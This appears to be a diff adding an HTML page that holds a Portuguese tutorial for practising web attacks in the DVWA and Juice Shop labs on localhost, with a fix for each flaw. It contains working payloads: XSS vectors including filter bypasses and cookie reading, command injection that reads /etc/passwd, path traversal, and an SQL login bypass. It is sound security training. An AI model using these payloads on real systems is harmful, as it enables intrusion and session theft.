+A raiz do problema é **misturar dado com código**. A correção é **separar** usando **consultas parametrizadas** (prepared statements) — o `?` é um espaço reservado e o valor entra **como dado**, nunca como SQL:
+```php
+// 🔴 Vulnerável
+$sql = "SELECT first_name,last_name FROM users WHERE user_id = '$id'";
+
+// 🟢 Seguro
+$stmt = $pdo->prepare("SELECT first_name,last_name FROM users WHERE user_id = ?");
+$stmt->execute([$id]);
+```
+Com isso, mesmo que o usuário digite `1' OR '1'='1`, o banco procura **literalmente** por esse texto como ID — a injeção deixa de funcionar.
+
+> 🎯 **Desafio extra:** mude o DVWA para **Medium** e tente de novo. Lá a entrada vai por POST e há um filtro simples — você vai precisar adaptar os payloads. É assim que se treina para a prova.
+
+---
+
+## Parte 3 — XSS Refletido no DVWA (20 min)
+
+**O que é:** XSS (*Cross-Site Scripting*) acontece quando a aplicação **devolve a sua entrada dentro da página sem escapar**, e o navegador executa esse texto como se fosse HTML/JavaScript do próprio site. Resultado: você roda **o seu** código no navegador de quem abrir a página. É a CWE-79.
+
+Há dois tipos principais (volto neles no 3.7):
+- **Refletido** (o desta parte): o código volta na **resposta imediata** da requisição (ex.: um parâmetro na URL). Precisa que a vítima clique num link preparado.
+- **Armazenado**: o código fica **salvo no servidor** (ex.: um comentário) e dispara para **todo mundo** que abrir a página. Mais perigoso.
+
+> **⚠️ Onde testar:** no **navegador (Firefox)**, dentro do DVWA — **não** no terminal. Abra `http://localhost:8081` logado, nível **Low**, e no menu da esquerda clique em **XSS (Reflected)**. A página tem um campo **"What's your name?"** com um botão **Submit** — é aí que você digita os payloads abaixo.
+
+### 3.1 Entender o que acontece por baixo
+
+Quando você digita um nome e dá Submit, o DVWA monta a resposta colando a sua entrada no meio do HTML, assim:
+```html
+<pre>Hello SEU_NOME</pre>
+```
+Se você digitar `Rafael`, vira `<pre>Hello Rafael</pre>` — inofensivo. Mas se a sua entrada **for** HTML/JS, ela entra como **código de verdade** na página. É exatamente isso que vamos explorar.
+
+### 3.2 Comportamento normal (o "antes")
+
+No campo **What's your name?**, digite um nome comum e Submit:
+```
+Rafael
+```
+*O que esperar:* a página responde `Hello Rafael`. Guarde essa referência do "normal".
+
+### 3.3 Confirmar o XSS (o alerta clássico)
+
+Agora, no mesmo campo, digite e Submit:
+```
+<script>alert('XSS')<\/script>
+```
+*Para que serve:* injeta uma tag `<script>` na página. Se a entrada não for escapada, o navegador a executa como parte do site.
+*O que esperar:* uma **caixinha de alerta** com "XSS" aparece na tela. Isso prova que **o seu JavaScript rodou** — a falha existe. 🎯
+
+### 3.4 Ver a injeção no código-fonte (por que funcionou)
+
+Feche o alerta, aperte **F12** → aba **Inspetor** (ou `Ctrl+U` para o código-fonte) e procure o trecho do "Hello". Você vai ver:
+```html
+<pre>Hello <script>alert('XSS')<\/script></pre>
+```
+*O que observar:* a sua tag virou **HTML de verdade** dentro da página — não é mais texto. Essa é a diferença entre **dado** e **código**: o DVWA tratou a sua entrada como código. (Numa aplicação segura apareceria escapado, como `&lt;script&gt;...`, ou seja, texto inofensivo na tela.)
+
+### 3.5 Variação sem `<script>` (para driblar filtros)
+
+Alguns filtros bloqueiam a palavra `script`. Dá para executar JS por outros caminhos. No campo, digite:
+```
+<img src=x onerror=alert('XSS')>
+```
+*Para que serve:* cria uma imagem com endereço inválido (`src=x`); quando o navegador falha ao carregá-la, dispara o evento `onerror`, que roda o seu JS — **sem** usar a tag `<script>`.
+*O que esperar:* o mesmo alerta, por um caminho que um filtro ingênuo não pega. Outras variações úteis de conhecer: `<svg onload=alert(1)>` e `<body onload=alert(1)>`.
+
+### 3.6 Entender o impacto real (por que XSS é grave)
+
+O alerta é só a prova de conceito. O perigo é que o seu JS roda **com os privilégios da vítima** no site. Para sentir isso no lab, digite:
+```
+<script>alert(document.cookie)<\/script>
+```
+*O que esperar:* o alerta mostra o **cookie de sessão** da vítima (ex.: o `PHPSESSID`). Repare: o script conseguiu **ler o cookie**. Num ataque real, em vez de mostrar num alerta, o atacante **enviaria** esse cookie para um servidor dele e o usaria para **se passar pela vítima** (sequestro de sessão), sem nunca saber a senha. Com XSS também dá para redirecionar a vítima para uma página falsa, alterar o conteúdo (phishing) ou registrar o que ela digita.
+
+> 💡 É por isso que cookies de sessão devem ter a flag **`HttpOnly`**: ela impede justamente que o `document.cookie` enxergue o cookie pelo JavaScript, cortando esse roubo mesmo quando há XSS.
+
+### 3.7 Refletido × Armazenado (a diferença na prática)
+
+Olhe a URL depois do Submit: `.../vulnerabilities/xss_r/?name=<script>...`. O payload está **na URL** — é **refletido**: se você mandar esse link para alguém logado, o XSS dispara no navegador da pessoa. Já no **XSS (Stored)** do DVWA (o campo de mensagem do *guestbook*), o payload fica **salvo no servidor** e dispara sozinho para **qualquer um** que abrir a página. Teste lá depois: digite `<script>alert('stored')<\/script>` na mensagem, salve, e veja o alerta voltar toda vez que a página recarrega — inclusive para outros usuários.
+
+### 3.8 Como corrigir 🟢
+
+A raiz é a mesma de toda injeção: **misturar dado com código**. A correção é **escapar a saída** conforme o contexto, para a entrada do usuário virar **texto**, nunca HTML:
+```php
+// 🔴 Vulnerável — joga a entrada crua no HTML
+echo "Hello " . $_GET['name'];
+
+// 🟢 Seguro — escapa os caracteres especiais de HTML
+echo "Hello " . htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8');
+```
+Com `htmlspecialchars`, o `<` vira `&lt;` e o `>` vira `&gt;` — então `<script>` aparece como **texto na tela**, sem executar. Camadas extras: **Content-Security-Policy** (restringe de onde o JS pode rodar) e a flag **HttpOnly** nos cookies (protege a sessão mesmo se houver XSS).
+
+> 🎯 **Desafio extra:** suba o DVWA para **Medium** e **High** e veja os filtros aparecerem — você vai precisar das variações do 3.5 (sem `<script>`) para contornar. É assim que se treina para a prova.
+
+---
+
+## Parte 4 — Command Injection no DVWA (15 min)
+
+**O que é:** a aplicação passa a sua entrada para um **comando do sistema** sem tratar. Você anexa um segundo comando. CWE-78.
+
+**Explorar:**
+1. No DVWA, vá em **Command Injection**.
+2. Comportamento normal — no campo de IP, digite:
+   ```
+   127.0.0.1
+   ```
+   *O que esperar:* a saída de um **ping** normal para 127.0.0.1.
+3. Agora injete um segundo comando:
+   ```
+   127.0.0.1; cat /etc/passwd
+   ```
+   *Para que serve:* o `;` encerra o ping e o `cat /etc/passwd` roda em seguida, no servidor. Se a entrada não for tratada, o sistema executa os dois.
+   *O que esperar:* além do ping, aparece o **conteúdo do `/etc/passwd`** — a lista de usuários do servidor. Você executou um comando no sistema.
+4. Teste também:
+   ```
+   127.0.0.1 && whoami
+   ```
+   *O que esperar:* o ping e, no fim, o **nome do usuário** que roda o servidor web (ex.: `www-data`).
+
+**Como corrigir 🟢:** nunca montar comando com entrada do usuário; usar APIs seguras / listas de argumentos e validar a entrada (allowlist).
+
+---
+
+## Parte 5 — File Inclusion / LFI no DVWA (15 min)
+
+**O que é:** a aplicação inclui um arquivo cujo caminho vem da sua entrada, sem validar. Você lê arquivos do servidor. CWE-98.
+
+**Explorar:**
+1. No DVWA, vá em **File Inclusion**. Repare na URL: `...?page=include.php`.
+2. Troque o parâmetro `page` por um arquivo do sistema:
+   ```
+   http://localhost:8081/vulnerabilities/fi/?page=/etc/passwd
+   ```
+   *Para que serve:* o valor de `page` é usado direto para abrir um arquivo; trocando por um caminho do sistema, você faz a aplicação ler o que não devia.
+   *O que esperar:* o **conteúdo do `/etc/passwd`** aparece dentro da página.
+3. Teste "path traversal" (subir de pasta até a raiz):
+   ```
+   http://localhost:8081/vulnerabilities/fi/?page=../../../../etc/passwd
+   ```
+   *Para que serve:* cada `../` sobe um nível de diretório — útil quando você não sabe o caminho absoluto.
+   *O que esperar:* o mesmo conteúdo do `/etc/passwd`.
+
+**Como corrigir 🟢:** nunca incluir caminho vindo do usuário; usar **allowlist** de arquivos permitidos e caminho absoluto fixo.
+
+---
+
+## Parte 6 — Juice Shop: login como admin via SQLi (15 min)
+
+**O que é:** mesmo princípio da Parte 2, agora numa aplicação moderna (SPA).
+
+**Explorar:**
+1. Abra `http://localhost:3000` e vá em **Account → Login**.
+2. No campo **Email**, digite:
+   ```
+   ' OR 1=1--
+   ```
+   No campo **Password**, digite qualquer coisa. Clique em **Log in**.
+   *Para que serve:* a condição `1=1` é sempre verdadeira e o `--` comenta o resto da checagem de senha; a consulta de login passa a casar com o **primeiro** usuário da tabela.
+   *O que esperar:* você entra **como o primeiro usuário (admin)** — a injeção burlou a autenticação. No topo aparece o e-mail do admin logado.
+3. Explore o **placar de desafios**:
+   ```
+   http://localhost:3000/#/score-board
+   ```
+   *O que esperar:* a tela de desafios do Juice Shop (achar o placar já é um desafio!).
+
+**Como corrigir 🟢:** consultas parametrizadas + **nunca** autenticar comparando string montada com a entrada.
+
+---
+
+## Encerramento
+
+- Suba a dificuldade do DVWA (**Medium** → **High**) e veja como os mesmos ataques exigem técnicas melhores (bypass de filtros).
+- Fixe a lógica: **toda** injeção nasce de **misturar dado com código** — e a defesa é sempre **separar** (parametrizar / escapar / validar).
+- Para a competição, treine **velocidade**: reconhecer a falha e explorar rápido, documentando cada passo (print + comando) para o relatório.
+
+➡️ Quando você dominar isto, parta para o **WebGoat** (`http://localhost:8080/WebGoat`), que traz lições guiadas mais avançadas.
+</script>
+
+<script>
+(function(){
+  // navegação entre abas
+  var tabs=document.querySelectorAll('.tab');
+  tabs.forEach(function(b){
+    b.addEventListener('click',function(){
+      tabs.forEach(function(x){x.classList.remove('active');});
+      b.classList.add('active');
+      document.querySelectorAll('.panel').forEach(function(p){p.classList.remove('active');});
+      document.getElementById(b.dataset.tab).classList.add('active');
+      window.scrollTo(0,0);
+    });
+  });
+  // render
+  var s=document.getElementById('md-sobre'), t=document.getElementById('md-tut');
+  document.getElementById('mount-sobre').innerHTML=mdToHtml(s?s.textContent:'');
+  document.getElementById('mount-tut').innerHTML=mdToHtml(t?t.textContent:'');
+
+  function mdToHtml(src){
+    src = src.split('<\\/script>').join('<\/script>');
+    var fences=[];
+    src = src.replace(/```([\s\S]*?)```/g, function(m,c){ fences.push(c.replace(/^([a-zA-Z0-9_-]+)?\n/,'').replace(/\n$/,'')); return '\u0000F'+(fences.length-1)+'\u0000'; });
+    function esc(s){ return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
+    function inl(t){ t=esc(t); t=t.replace(/`([^`]+)`/g,'<code>$1</code>'); t=t.replace(/\*\*([^*]+)\*\*/g,'<b>$1</b>'); return t; }
+    var lines=src.split('\n'), out=[], inUl=false, inOl=false;
+    function closeL(){ if(inUl){out.push('</ul>');inUl=false;} if(inOl){out.push('</ol>');inOl=false;} }
+    for(var i=0;i<lines.length;i++){
+      var ln=lines[i], t=ln.trim();
+      var fm=t.match(/^\u0000F(\d+)\u0000$/);
+      if(fm){ closeL(); out.push('<pre>'+esc(fences[+fm[1]])+'</pre>'); continue; }
+      if(/^#### /.test(ln)){ closeL(); out.push('<h4>'+inl(ln.slice(5))+'</h4>'); continue; }
+      if(/^### /.test(ln)){ closeL(); out.push('<h3>'+inl(ln.slice(4))+'</h3>'); continue; }
+      if(/^## /.test(ln)){ closeL(); out.push('<h2>'+inl(ln.slice(3))+'</h2>'); continue; }
+      if(/^# /.test(ln)){ closeL(); out.push('<h1>'+inl(ln.slice(2))+'</h1>'); continue; }
+      if(/^---\s*$/.test(ln)){ closeL(); out.push('<hr>'); continue; }
+      if(/^>\s?/.test(ln)){ closeL(); out.push('<blockquote>'+inl(ln.replace(/^>\s?/,''))+'</blockquote>'); continue; }
+      var mo=ln.match(/^\s*\d+\.\s+(.*)$/);
+      if(mo){ if(!inOl){closeL();out.push('<ol>');inOl=true;} out.push('<li>'+inl(mo[1])+'</li>'); continue; }
+      var mu=ln.match(/^\s*[-*]\s+(.*)$/);
+      if(mu){ if(!inUl){closeL();out.push('<ul>');inUl=true;} out.push('<li>'+inl(mu[1])+'</li>'); continue; }
+      if(t===''){ closeL(); continue; }
+      closeL(); out.push('<p>'+inl(ln)+'</p>');
+    }
+    closeL();
+    return out.join('\n');
+  }
+})();
+</script>
+</body>
+</html>
